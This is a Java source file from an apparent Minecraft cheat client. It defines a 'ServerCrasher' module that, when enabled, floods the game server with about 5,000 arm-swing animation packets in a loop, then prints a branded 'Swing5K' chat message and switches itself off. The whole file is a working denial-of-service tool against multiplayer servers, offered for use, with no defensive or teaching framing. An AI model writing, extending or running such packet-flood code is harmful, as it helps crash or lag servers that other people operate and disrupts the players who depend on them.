package wtf.kiddo.skidcraft.mod.impl.world;

import me.bush.eventbus.annotation.EventListener;
import net.minecraft.src.*;
import wtf.kiddo.skidcraft.Client;
import wtf.kiddo.skidcraft.event.PacketEvent;
import wtf.kiddo.skidcraft.event.Render2DEvent;
import wtf.kiddo.skidcraft.mod.Category;
import wtf.kiddo.skidcraft.mod.Mod;

/**
 * Author: zcy
 * Created: 2022/5/1
 */
public final class ServerCrasher extends Mod {
    public ServerCrasher() {
        super("ServerCrasher", Category.WORLD);
//        this.setEnabled(true);
    }

/*    @EventListener
    public void onRender2DEvent(final Render2DEvent event) {

    }*/

    @Override
    protected void onEnable() {
        for(int i = 0; i <= 5000;i++){
            mc.thePlayer.sendQueue.addToSendQueue(new Packet18Animation(mc.thePlayer, 1));
        }
        mc.thePlayer.addChatMessage("§8[§c§lFDP§6§lClient§8] §fMODE: Swing5K");
        this.toggle();
    }

    @Override
    protected void onDisable() {

    }
}
